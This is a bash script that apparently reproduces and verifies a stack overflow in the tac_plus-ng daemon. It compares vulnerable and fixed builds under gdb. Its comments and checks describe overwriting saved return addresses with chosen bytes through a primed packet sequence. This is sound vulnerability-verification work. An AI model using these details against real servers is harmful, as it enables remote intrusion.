#!/usr/bin/env bash
# Live-daemon stack overflow with chosen bytes from a cross-packet prime.
# Trigger table: indices 0-7 = 8 (in-payload records), 8-12 = 255.  Index 12
# walks to in+1156, where the prime's "cmd=ZZZZ" pattern survives; its 251-byte
# memcpy into the 104-byte cmdline VLA overwrites live locals and saved control
# words.  Cases: vulnerable, fixed pin, vulnerable without prime.
set -u
cd "$(dirname "$0")"
H=$(pwd)
R=$(dirname "$H")
OS=linux-6.8.0-149-generic-x86_64
V="$R/src-plain/build/$OS/tac_plus-ng/tac_plus-ng"
VL="$R/src-plain/build/$OS/mavis"
F="$R/src-fixed-plain/build/$OS/tac_plus-ng/tac_plus-ng"
FL="$R/src-fixed-plain/build/$OS/mavis"
FAIL=0

if [ ! -x "$V" ] || [ ! -x "$F" ]; then
    echo "plain builds missing; see PROVENANCE.md"
    exit 2
fi

norm() {
    sed -E \
      -e 's/0x[0-9a-fA-F]+/0xADDR/g' \
      -e "s#$R#ROOT#g" "$1"
}

run_case() {
    local name="$1" bin="$2" libdir="$3" port="$4" extra="$5"
    python3 "$H/run_gdb2.py" --bin "$bin" --libdir "$libdir" --port "$port" \
        --log "$H/overflow-$name.log" --gdbcmd "$H/gdb-overflow.cmd" \
        --client wire4.py --client-args="--skips 8,9,10,11,12 $extra" \
        > "$H/overflow-$name.stdout" 2>/dev/null
    echo "case=$name runner_rc=$?"
}

emit() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "PASS $label"
    else
        echo "FAIL $label (pattern /$pattern/ absent)"
        FAIL=$((FAIL + 1))
    fi
}

absent() {
    local label="$1" file="$2" pattern="$3"
    if norm "$file" | grep -qE "$pattern"; then
        echo "FAIL $label (unexpected /$pattern/)"
        FAIL=$((FAIL + 1))
    else
        echo "PASS $label"
    fi
}

emit_raw() {
    local label="$1" file="$2" pattern="$3"
    if grep -qE "$pattern" "$file"; then
        echo "PASS $label"
    else
        echo "FAIL $label (pattern /$pattern/ absent)"
        FAIL=$((FAIL + 1))
    fi
}

absent_raw() {
    local label="$1" file="$2" pattern="$3"
    if grep -qE "$pattern" "$file"; then
        echo "FAIL $label (unexpected /$pattern/)"
        FAIL=$((FAIL + 1))
    else
        echo "PASS $label"
    fi
}

extract() {
    local name="$1"
    {
        echo "case=$name"
        grep -a '^trigger seq' "$H/overflow-$name.stdout" || true
        norm "$H/overflow-$name.log" | grep -E \
          '^(PRIME in|TRIG in|PRE |POST saved|Program received signal|EVALARGS|author.c:92)' \
          | head -40
    }
}

echo "=== vulnerable pin + prime + 255-byte OOB cmd= copy ==="
run_case vuln "$V" "$VL" 4999 ""
emit vuln_big_copy "$H/overflow-vuln.log" '^PRE i=12 l=255 '
emit_raw vuln_control_words "$H/overflow-vuln.log" '^POST saved_rbp=0x3d646d635a5a5a5a saved_rip=0x3d646d635a5a5a5a$'
emit_raw vuln_chosen_vla "$H/overflow-vuln.log" '^0x[0-9a-f]+:.*0x5a.*0x5a'
emit vuln_local_clobber "$H/overflow-vuln.log" '^L78 i=1515870810 tlen=1515870810 '
emit vuln_segv "$H/overflow-vuln.log" 'Program received signal SIGSEGV.*'

echo "=== fixed pin + same wire input ==="
run_case fixed "$F" "$FL" 5000 ""
absent fixed_no_eval "$H/overflow-fixed.log" '^EVALARGS '
emit fixed_reply_57 "$H/overflow-fixed.stdout" 'reply_len=57'

echo "=== vulnerable pin + trigger only (no prime) ==="
absent_raw noprime_no_control_write "$H/overflow-noprime.log" '^POST saved_rbp=0x3d646d635a5a5a5a'
emit noprime_reply_18 "$H/overflow-noprime.stdout" 'reply_len=18'

echo "=== normalized evidence hashes ==="
for n in vuln fixed noprime; do
    printf '%s ' "$n"
    extract "$n" | sha256sum | cut -d' ' -f1
done
echo "FAILURES=$FAIL"
exit "$FAIL"
